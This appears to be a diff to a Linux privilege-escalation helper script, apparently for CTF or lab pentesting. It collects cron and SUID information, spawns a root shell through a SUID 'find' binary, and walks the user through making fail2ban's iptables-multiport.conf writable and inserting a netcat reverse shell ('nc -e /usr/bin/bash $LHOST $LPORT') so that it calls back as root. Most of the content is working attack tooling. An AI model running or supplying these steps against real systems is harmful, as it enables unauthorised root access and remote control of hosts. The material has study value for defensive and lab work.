@@ -22,7 +22,7 @@ read LPORT
 echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins";tput sgr0
 echo "Current user is $i within group $d" > info.txt
 echo "Script last ran on $now" >> info.txt
-echo -e '\E[31;40m' "Looking at cronjobs";tput sgr0
+echo '\E[31;40m' "Looking at cronjobs";tput sgr0
 cat /etc/crontab >> info.txt
 if grep "apt-get" info.txt; then
 	ls -la /etc/apt | grep apt.conf.d
@@ -51,8 +51,8 @@ if [ $answer = n ] ; then
 	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
 else
 	find / -perm -u=s -type f 2>/dev/null >> info.txt
-	echo -e '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
-	echo -e '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
+	echo '\E[31;40m' "Saved SUID Bits to info.txt"; tput sgr0
+	echo '\E[32;40m' "This could take a while, script is not stuck"; tput sgr0
 	if grep "/usr/bin/find" info.txt; then
 		cd /usr/bin
 		./find . -exec /bin/bash -p \; -quit
@@ -372,26 +372,32 @@ else
 fi
 find /etc -writable -ls 2>/dev/null > write.txt
 if grep "/etc/fail2ban" write.txt; then
-	ls -la /etc/fail2ban
-	read -p "Do you have write permissions over folder (y/n):" answer
+	ls -la /etc/fail2ban | grep action.d
+	read -p "Do you have write permissions over folder action.d (y/n):" answer
 	if [ $answer = "y" ]; then
 		cd /etc/fail2ban
 		echo -e '\E[32;40m' "Walkthrough can be found here https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
+		sleep 2
 		echo -e '\E[31;40m' "Checking jail.conf"
 		cat /etc/fail2ban/jail.conf
 		cd action.d
 		echo -e '\E[32;40m' "Take note of maxretry"
+		read -p "Hit enter to continue after looking at maxretry" answer
 		echo -e '\E[31;40m' "Renaming iptables-multiport.conf to iptables-multiport.conf.bak"
 		mv  iptables-multiport.conf iptables-multiport.conf.bak
 		echo -e '\E[31;40m' "Remaking iptables-multiport.conf so you have permissions to it"
 		cp iptables-multiport.conf.bak iptables-multiport.conf
 		chmod 666 iptables-multiport.conf
 		echo -e '\E[31;40m' "Now you need to open iptables-multiport.conf and put a reverse shell in the actionban location (ex: actionban= /usr/bin/nc -e /usr/bin/bash $LHOST $LPORT)"
+		sleep 5
 		echo -e '\E[32;40m' "After this has been accomplished make sure you start up a listener on your kali machine and fail to login through, this is where maxretry comes into play (ex: if maxretry is 5 you need to fail to login 5 times):"
+		sleep 5
 		echo -e '\E[31;40m' "Once you have failed to login so many time, you will get a call back from the machine and should be root"
+		sleep 5
 	else
 		echo -e '\E[31;40m' "Not exploitable with fail2ban exploit, if you want to try manually https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49"
 	fi
+	exit 1
 fi
 if grep LEGEND lin.txt
 then
@@ -448,3 +454,4 @@ then
 		fi
 	fi
 fi
+
